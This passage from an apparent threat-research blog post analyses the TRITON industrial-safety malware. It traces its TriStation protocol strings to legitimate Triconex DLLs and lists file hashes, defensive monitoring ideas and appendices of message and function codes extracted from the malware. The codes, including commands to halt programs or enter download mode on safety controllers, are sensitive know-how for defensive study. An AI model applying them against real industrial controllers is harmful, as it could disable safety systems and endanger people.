  error handling throughout the code suggests thoughtful development and
  testing of the framework. This complicates the theory of &quot;ground
  up&quot; development, so did they base their code on something else?</p>
 <p>While learning from the TriStation functionality within TRITON, we
  continued to explore legitimate TriStation software. We began our
  search for &quot;TS1131.exe&quot; and hit dead ends sorting through
  TriStation DLLs until we came across a variety of TriStation utilities
  in MSI form. We ultimately stumbled across a juicy archive containing
  &quot;Trilog v4.&quot; Upon further inspection, this file installed
  &quot;TriLog.exe,&quot; which the original TRITON executable mimicked,
  and a couple of supporting DLLs, all of which were timestamped around
  August 2006.</p>
 <p>When we saw the DLL file description &quot;Tricon Communications
  Interface&quot; and original file name &quot;TricCom.DLL&quot;, we
  knew we were in the right place. With a simple look at the file
  strings, &quot;BAZINGA!&quot; We struck gold.</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="173" valign="top"><p>
          <b>File Name</b></p> </td> <td width="451" valign="top"><p>
          <b>tr1com40.dll</b></p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>MD5</b></p> </td> <td width="451"
        valign="top"><p>069247DF527A96A0E048732CA57E7D3D</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>Size</b></p> </td> <td width="451"
        valign="top"><p>110592</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>Compile Date</b></p> </td> <td width="451"
        valign="top"><p>2006-08-23</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>File Description</b></p> </td> <td width="451"
          valign="top"><p>Tricon Communications Interface</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>Product Name</b></p> </td> <td width="451"
          valign="top"><p>TricCom Dynamic Link Library</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>File Version</b></p> </td> <td width="451"
        valign="top"><p>4.2.441</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>Original File Name </b></p> </td> <td width="451"
        valign="top"><p>TricCom.DLL</p> </td> </tr>
    <tr>
      <td width="173" valign="top"><p>
          <b>Copyright</b></p> </td> <td width="451"
          valign="top"><p>Copyright © 1993-2006 Triconex Corporation</p>
      </td> </tr></tbody></table>
 <p>The tr1com40.DLL is exactly what you would expect to see in a custom
  application package. It is a library that helps support the
  communications for a Triconex controller. If you've pored over TRITON
  as much as we have, the moment you look at strings you can see the
  obvious overlaps between the legitimate DLL and TRITON's own TS_cnames.pyc.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig8.png" />
  <br /> <span class="type-XS">Figure 8: Strings excerpt from tr1com40.DLL</span></p>
 <p>Each of the execution command &quot;error codes&quot; from
  TS_cnames.pyc are in the strings of tr1com40.DLL (Figure 8). We see
  &quot;An MP has re-educated&quot; and &quot;Invalid Tristation I
  command&quot;. Even misspelled command strings verbatim such as
  &quot;Non-existant data item&quot; and &quot;Alocate network
  accepted&quot;. We also see many of the same unknown values. What is
  obvious from this discovery is that some of the strings in TRITON are
  likely based on code used in communications libraries for Trident and
  Tricon controllers.</p>
 <p>In our brief survey of the legitimate Triconex Corporation binaries,
  we observed a few samples with related string tables.</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="88" valign="top"><p>
          <b>Pe:dllname</b></p> </td> <td width="87" valign="top"><p>
          <b>Compile Date</b></p> </td> <td width="455" valign="top"><p>
          <b>Reference CPP Strings Code</b></p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Lagcom40.dll</b></p> </td> <td width="87"
        valign="top"><p>2004/11/19</p> </td> <td width="455"
          valign="top"><p>$Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21
          1999 17:17:26  $ $Revision:   1.0</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Tr1com40.dll</b></p> </td> <td width="87"
        valign="top"><p>2006/08/23</p> </td> <td width="455"
          valign="top"><p>$Workfile:   TR1STRS.CPP  $ $Modtime:   May 16
          2006 09:55:20  $ $Revision:   1.4</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Tridcom.dll</b></p> </td> <td width="87"
        valign="top"><p>2008/07/23</p> </td> <td width="455"
          valign="top"><p>$Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21
          1999 17:17:26  $ $Revision:   1.0</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Triccom.dll</b></p> </td> <td width="87"
        valign="top"><p>2008/07/23</p> </td> <td width="455"
          valign="top"><p>$Workfile:   TR1STRS.CPP  $ $Modtime:   May 16
          2006 09:55:20  $ $Revision:   1.4</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Tridcom.dll</b></p> </td> <td width="87"
        valign="top"><p>2010/09/29</p> </td> <td width="455"
          valign="top"><p>$Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21
          1999 17:17:26  $ $Revision:   1.0 </p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Tr1com.dll</b></p> </td> <td width="87"
        valign="top"><p>2011/04/27</p> </td> <td width="455"
          valign="top"><p>$Workfile:   TR1STRS.CPP  $ $Modtime:   May 16
          2006 09:55:20  $ $Revision:   1.4</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Lagcom.dll</b></p> </td> <td width="87"
        valign="top"><p>2011/04/27</p> </td> <td width="455"
          valign="top"><p>$Workfile:   LAGSTRS.CPP  $ $Modtime:   Jul 21
          1999 17:17:26  $ $Revision:   1.0</p> </td> </tr>
    <tr>
      <td width="88" valign="top"><p>
          <b>Triccom.dll</b></p> </td> <td width="87"
        valign="top"><p>2011/04/27</p> </td> <td width="455"
          valign="top"><p>$Workfile:   TR1STRS.CPP  $ $Modtime:   May 16
          2006 09:55:20  $ $Revision:   1.4</p> </td> </tr></tbody></table>
 <p>We extracted the CPP string tables in TR1STRS and LAGSTRS and the
  TS_cnames.pyc TS_names array from TRITON, and compared the 210, 204,
  and 212 relevant strings from each respective file.</p>
 <p>TS_cnames.pyc TS_names and tr1com40.dll share 202 of 220 combined
  table strings. The remaining strings are unique to each, as seen here:</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="282" valign="top"><p>
          <b>TS_cnames.TS_names (2017 pyc) </b></p> </td> <td
        width="270" valign="top"><p>
          <b>Tr1com40.dll (2006 CPP) </b></p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Go to DOWNLOAD mode</p> </td> <td
        width="270" valign="top"><p>&lt;200&gt;</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Not set</p> </td> <td width="270"
        valign="top"><p>&lt;209&gt;</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk75</p> </td> <td width="270"
          valign="top"><p>Bad message from module</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk76</p> </td> <td width="270"
          valign="top"><p>Bad message type</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk77</p> </td> <td width="270"
          valign="top"><p>Bad TMI version number</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk78</p> </td> <td width="270"
          valign="top"><p>Module did not respond</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk79</p> </td> <td width="270"
          valign="top"><p>Open Connection: Invalid SAP %d</p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk81</p> </td> <td width="270"
          valign="top"><p>Unsupported message for this TMI version</p>
      </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Unk83</p> </td> <td width="270"
        valign="top"><p> </p> </td> </tr>
    <tr>
      <td width="282" valign="top"><p>Wrong command</p> </td> <td
        width="270" valign="top"><p> </p> </td> </tr></tbody></table>
 <p>TS_cnames.pyc TS_names and Tridcom.dll (1999 CPP) shared only 151 of
  268 combined table strings, showing a much smaller overlap with the
  seemingly older CPP library. This makes sense based on the context
  that Tridcom.dll is meant for a Trident controller, not a Tricon
  controller. It does seem as though Tr1com40.dll and TR1STRS.CPP code
  was based on older work.</p>
 <p>We are not shocked to find that the threat actor reversed legitimate
  code to bolster development of the TRITON framework. They want to work
  smarter, not harder, too. But after reverse engineering legitimate
  software and implementing the basics of the TriStation, the threat
  actors still had an incomplete understanding of the protocol. In
  TRITON's TS_cnames.pyc we saw &quot;Unk75&quot;, &quot;Unk76&quot;,
  &quot;Unk83&quot; and other values that were not present in the
  tr1com40.DLL strings, indicating that the TRITON threat actor may have
  explored the protocol and annotated their findings beyond what they
  reverse engineered from the DLL. The gaps in TriStation implementation
  show us why the actors encountered problems interacting with the
  Triconex controllers when using TRITON in the wild.</p>
 <p>You can see more of the Trilog and Triconex DLL files on VirusTotal.</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="137" valign="top"><p>Item Name</p> </td> <td
        width="226" valign="top"><p>MD5</p> </td> <td width="189"
        valign="top"><p>Description</p> </td> </tr>
    <tr>
      <td width="137" valign="top"><p>Tr1com40.dll</p> </td> <td
        width="226" valign="top"><p>069247df527a96a0e048732ca57e7d3d</p>
      </td> <td width="189" valign="top"><p>Tricom Communcations DLL</p>
      </td> </tr>
    <tr>
      <td width="137" valign="top"><p>Data1.cab</p> </td> <td
        width="226" valign="top"><p>e6a3c93a6d433cbaf6f573b6c09d76c4</p>
      </td> <td width="189" valign="top"><p>Parent of Tr1com40.dll</p>
      </td> </tr>
    <tr>
      <td width="137" valign="top"><p>Trilog v4.1.360R</p> </td> <td
        width="226" valign="top"><p>13a3b83ba2c4236ca59aba679941c8a5</p>
      </td> <td width="189" valign="top"><p>RAR Archive of TriLog</p>
      </td> </tr>
    <tr>
      <td width="137" valign="top"><p>TridCom.dll</p> </td> <td
        width="226" valign="top"><p>5c2ed617fdec4779cb33c89082a43100</p>
      </td> <td width="189" valign="top"><p>Trident Communications
        DLL</p> </td> </tr></tbody></table>
 <h4>Afterthoughts</h4>
 <p>Seeing Triconex systems targeted with malicious intent was new to
  the world six months ago. Moving forward it would be reasonable to
  anticipate additional frameworks, such as TRITON, designed for usage
  against other SIS controllers and associated technologies. If Triconex
  was within scope, we may see similar attacker methodologies affecting
  the dominant industrial safety technologies.</p>
 <p>Basic security measures do little to thwart truly persistent threat
  actors and monitoring only IT networks is not an ideal situation.
  Visibility into both the IT and OT environments is critical for
  detecting the various stages of an ICS intrusion. Simple detection
  concepts such as baseline deviation can provide insight into abnormal activity.</p>
 <p>While the TRITON framework was actively in use, how many traditional
  ICS “alarms” were set off while the actors tested their exploits and
  backdoors on the Triconex controller? How many times did the
  TriStation protocol, as implemented in their Python scripts, fail or
  cause errors because of non-standard traffic? How many TriStation UDP
  pings were sent and how many Connection Requests? How did these
  statistics compare to the baseline for TriStation traffic? There are
  no answers to these questions for now. We believe that we can identify
  these anomalies in the long run if we strive for increased visibility
  into ICS technologies.</p>
 <p>We hope that by holding public discussions about ICS technologies,
  the Infosec community can cultivate closer relationships with ICS
  vendors and give the world better insight into how attackers move from
  the IT to the OT space. We want to foster more conversations like this
  and generally share good techniques for finding evil. Since most of
  all ICS attacks involve standard IT intrusions, we should probably
  come together to invent and improve any guidelines for how to monitor
  PCs and engineering workstations that bridge the IT and OT networks.
  We envision a world where attacking or disrupting ICS operations costs
  the threat actor their cover, their toolkits, their time, and their
  freedom. It's an ideal world, but something nice to shoot for.</p>
 <h4>Thanks and Future Work</h4>
 <p>There is still much to do for TRITON and TriStation. There are many
  more sub-message types and nuances for parsing out the nitty gritty
  details, which is hard to do without a controller of our own. And
  although we’ve published much of what we learned about the TriStation
  here on the blog, our work will continue as we continue our study of
  the protocol.</p>
 <p>Thanks to everyone who did so much public research on TRITON and
  TriStation. We have cited a few individuals in this blog post, but
  there is a lot more community-sourced information that gave us clues
  and leads for our research and testing of the framework and protocol.
  We also have to acknowledge the research performed by the TRITON
  attackers. We borrowed a lot of your knowledge about TriStation from
  the TRITON framework itself.</p>
 <p>Finally, remember that we're here to collaborate. We think most of
  our research is right, but if you notice any errors or omissions, or
  have ideas for improvements, please spear phish contact: smiller@fireeye.com.</p>
 <h4>Recommended Reading</h4>
 <ul style="list-style-position: inside;"> <li>
    <a
      href="https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html">Attackers
      Deploy New ICS Attack Framework “TRITON” and Cause Operational
      Disruption to Critical Infrastructure</a></li> <li>
    <a href="https://ieeexplore.ieee.org/document/7920614/">Attack
      Induced Common-Mode Failures on PLC-Based Safety System in a
      Nuclear Power Plant: Practical Experience Report</a></li> <li>
    <a
      href="https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware">Analyzing
      the TRITON industrial malware</a></li> <li>
    <a href="https://github.com/ICSrepo/TRISIS-TRITON-HATMAN">Repository
      containting original and decompiled files of TRISIS/TRITON/HATMAN
  malware</a></li> <li>
    <a href="https://dragos.com/blog/trisis/TRISIS-01.pdf">TRISIS
      Malware Analysis of Safety System Targeted Malware</a></li> </ul>
 <h4>Appendix A: TriStation Message Type Codes</h4>
 <p>The following table consists of hex values at offset 0 in the
  TriStation UDP packets and the associated dictionary definitions,
  extracted verbatim from the TRITON framework in library TS_cnames.pyc.</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="138" valign="top"><p>
          <b>Value at 0x0</b></p> </td> <td width="216" valign="top"><p>
          <b>Message Type</b></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>1</p> </td> <td width="216"
          valign="top"><p>Connection Request</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>2</p> </td> <td width="216"
          valign="top"><p>Connection Response</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>3</p> </td> <td width="216"
          valign="top"><p>Disconnect Request</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>4</p> </td> <td width="216"
          valign="top"><p>Disconnect Response</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>5</p> </td> <td width="216"
          valign="top"><p>Execution Command</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>6</p> </td> <td width="216"
          valign="top"><p>Ping Command</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>7</p> </td> <td width="216"
          valign="top"><p>Connection Limit Reached</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>8</p> </td> <td width="216"
          valign="top"><p>Not Connected</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>9</p> </td> <td width="216"
          valign="top"><p>MPS Are Dead</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>10</p> </td> <td width="216"
          valign="top"><p>Access Denied</p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>11</p> </td> <td width="216"
          valign="top"><p>Connection Failed</p> </td> </tr></tbody></table>
 <h4>Appendix B: TriStation Execution Command Function Codes</h4>
 <p>The following table consists of hex values at offset 6 in the
  TriStation UDP packets and the associated dictionary definitions,
  extracted verbatim from the TRITON framework in library TS_cnames.pyc.</p>
 <table width="480" cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="108" valign="top"><p>
          <b>Value at 0x6</b></p> </td> <td width="372" valign="top"><p>
          <b>TS_cnames String</b></p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>0</p> </td> <td width="372"
          valign="top"><p>0: 'Start download all',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1</p> </td> <td width="372"
          valign="top"><p>1: 'Start download change',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2</p> </td> <td width="372"
          valign="top"><p>2: 'Update configuration',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3</p> </td> <td width="372"
          valign="top"><p>3: 'Upload configuration',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4</p> </td> <td width="372"
          valign="top"><p>4: 'Set I/O addresses',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5</p> </td> <td width="372"
          valign="top"><p>5: 'Allocate network',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6</p> </td> <td width="372"
          valign="top"><p>6: 'Load vector table',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7</p> </td> <td width="372"
          valign="top"><p>7: 'Set calendar',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8</p> </td> <td width="372"
          valign="top"><p>8: 'Get calendar',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9</p> </td> <td width="372"
          valign="top"><p>9: 'Set scan time',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A</p> </td> <td width="372"
          valign="top"><p>10: 'End download all',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B</p> </td> <td width="372"
          valign="top"><p>11: 'End download change',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C</p> </td> <td width="372"
          valign="top"><p>12: 'Cancel download change',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D</p> </td> <td width="372"
          valign="top"><p>13: 'Attach TRICON',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E</p> </td> <td width="372"
          valign="top"><p>14: 'Set I/O address limits',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F</p> </td> <td width="372"
          valign="top"><p>15: 'Configure module',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>10</p> </td> <td width="372"
          valign="top"><p>16: 'Set multiple point values',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>11</p> </td> <td width="372"
          valign="top"><p>17: 'Enable all points',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>12</p> </td> <td width="372"
          valign="top"><p>18: 'Upload vector table',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>13</p> </td> <td width="372"
          valign="top"><p>19: 'Get CP status ',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>14</p> </td> <td width="372"
          valign="top"><p>20: 'Run program',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>15</p> </td> <td width="372"
          valign="top"><p>21: 'Halt program',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>16</p> </td> <td width="372"
          valign="top"><p>22: 'Pause program',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>17</p> </td> <td width="372"
          valign="top"><p>23: 'Do single scan',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>18</p> </td> <td width="372"
          valign="top"><p>24: 'Get chassis status',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>19</p> </td> <td width="372"
          valign="top"><p>25: 'Get minimum scan time',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1A</p> </td> <td width="372"
          valign="top"><p>26: 'Set node number',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1B</p> </td> <td width="372"
          valign="top"><p>27: 'Set I/O point values',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1C</p> </td> <td width="372"
          valign="top"><p>28: 'Get I/O point values',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1D</p> </td> <td width="372"
          valign="top"><p>29: 'Get MP status',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1E</p> </td> <td width="372"
          valign="top"><p>30: 'Set retentive values',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>1F</p> </td> <td width="372"
          valign="top"><p>31: 'Adjust clock calendar',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>20</p> </td> <td width="372"
          valign="top"><p>32: 'Clear module alarms',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>21</p> </td> <td width="372"
          valign="top"><p>33: 'Get event log',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>22</p> </td> <td width="372"
          valign="top"><p>34: 'Set SOE block',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>23</p> </td> <td width="372"
          valign="top"><p>35: 'Record event log',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>24</p> </td> <td width="372"
          valign="top"><p>36: 'Get SOE data',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>25</p> </td> <td width="372"
          valign="top"><p>37: 'Enable OVD',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>26</p> </td> <td width="372"
          valign="top"><p>38: 'Disable OVD',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>27</p> </td> <td width="372"
          valign="top"><p>39: 'Enable all OVDs',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>28</p> </td> <td width="372"
          valign="top"><p>40: 'Disable all OVDs',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>29</p> </td> <td width="372"
          valign="top"><p>41: 'Process MODBUS',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2A</p> </td> <td width="372"
          valign="top"><p>42: 'Upload network',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2B</p> </td> <td width="372"
          valign="top"><p>43: 'Set lable',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2C</p> </td> <td width="372"
          valign="top"><p>44: 'Configure system variables',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2D</p> </td> <td width="372"
          valign="top"><p>45: 'Deconfigure module',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2E</p> </td> <td width="372"
          valign="top"><p>46: 'Get system variables',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>2F</p> </td> <td width="372"
          valign="top"><p>47: 'Get module types',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>30</p> </td> <td width="372"
          valign="top"><p>48: 'Begin conversion table download',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>31</p> </td> <td width="372"
          valign="top"><p>49: 'Continue conversion table download',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>32</p> </td> <td width="372"
          valign="top"><p>50: 'End conversion table download',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>33</p> </td> <td width="372"
          valign="top"><p>51: 'Get conversion table',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>34</p> </td> <td width="372"
          valign="top"><p>52: 'Set ICM status',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>35</p> </td> <td width="372"
          valign="top"><p>53: 'Broadcast SOE data available',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>36</p> </td> <td width="372"
          valign="top"><p>54: 'Get module versions',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>37</p> </td> <td width="372"
          valign="top"><p>55: 'Allocate program',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>38</p> </td> <td width="372"
          valign="top"><p>56: 'Allocate function',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>39</p> </td> <td width="372"
          valign="top"><p>57: 'Clear retentives',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3A</p> </td> <td width="372"
          valign="top"><p>58: 'Set initial values',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3B</p> </td> <td width="372"
          valign="top"><p>59: 'Start TS2 program download',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3C</p> </td> <td width="372"
          valign="top"><p>60: 'Set TS2 data area',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3D</p> </td> <td width="372"
          valign="top"><p>61: 'Get TS2 data',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3E</p> </td> <td width="372"
          valign="top"><p>62: 'Set TS2 data',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>3F</p> </td> <td width="372"
          valign="top"><p>63: 'Set program information',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>40</p> </td> <td width="372"
          valign="top"><p>64: 'Get program information',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>41</p> </td> <td width="372"
          valign="top"><p>65: 'Upload program',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>42</p> </td> <td width="372"
          valign="top"><p>66: 'Upload function',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>43</p> </td> <td width="372"
          valign="top"><p>67: 'Get point groups',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>44</p> </td> <td width="372"
          valign="top"><p>68: 'Allocate symbol table',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>45</p> </td> <td width="372"
          valign="top"><p>69: 'Get I/O address',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>46</p> </td> <td width="372"
          valign="top"><p>70: 'Resend I/O address',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>47</p> </td> <td width="372"
          valign="top"><p>71: 'Get program timing',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>48</p> </td> <td width="372"
          valign="top"><p>72: 'Allocate multiple functions',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>49</p> </td> <td width="372"
          valign="top"><p>73: 'Get node number',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4A</p> </td> <td width="372"
          valign="top"><p>74: 'Get symbol table',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4B</p> </td> <td width="372"
          valign="top"><p>75: 'Unk75',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4C</p> </td> <td width="372"
          valign="top"><p>76: 'Unk76',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4D</p> </td> <td width="372"
          valign="top"><p>77: 'Unk77',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4E</p> </td> <td width="372"
          valign="top"><p>78: 'Unk78',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>4F</p> </td> <td width="372"
          valign="top"><p>79: 'Unk79',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>50</p> </td> <td width="372"
          valign="top"><p>80: 'Go to DOWNLOAD mode',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>51</p> </td> <td width="372"
          valign="top"><p>81: 'Unk81',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>52</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>53</p> </td> <td width="372"
          valign="top"><p>83: 'Unk83',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>54</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>55</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>56</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>57</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>58</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>59</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5A</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5B</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5C</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5D</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5E</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>5F</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>60</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>61</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>62</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>63</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>64</p> </td> <td width="372"
          valign="top"><p>100: 'Command rejected',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>65</p> </td> <td width="372"
          valign="top"><p>101: 'Download all permitted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>66</p> </td> <td width="372"
          valign="top"><p>102: 'Download change permitted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>67</p> </td> <td width="372"
          valign="top"><p>103: 'Modification accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>68</p> </td> <td width="372"
          valign="top"><p>104: 'Download cancelled',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>69</p> </td> <td width="372"
          valign="top"><p>105: 'Program accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6A</p> </td> <td width="372"
          valign="top"><p>106: 'TRICON attached',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6B</p> </td> <td width="372"
          valign="top"><p>107: 'I/O addresses set',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6C</p> </td> <td width="372"
          valign="top"><p>108: 'Get CP status response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6D</p> </td> <td width="372"
          valign="top"><p>109: 'Program is running',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6E</p> </td> <td width="372"
          valign="top"><p>110: 'Program is halted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>6F</p> </td> <td width="372"
          valign="top"><p>111: 'Program is paused',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>70</p> </td> <td width="372"
          valign="top"><p>112: 'End of single scan',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>71</p> </td> <td width="372"
          valign="top"><p>113: 'Get chassis configuration response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>72</p> </td> <td width="372"
          valign="top"><p>114: 'Scan period modified',</p> </td> </tr>
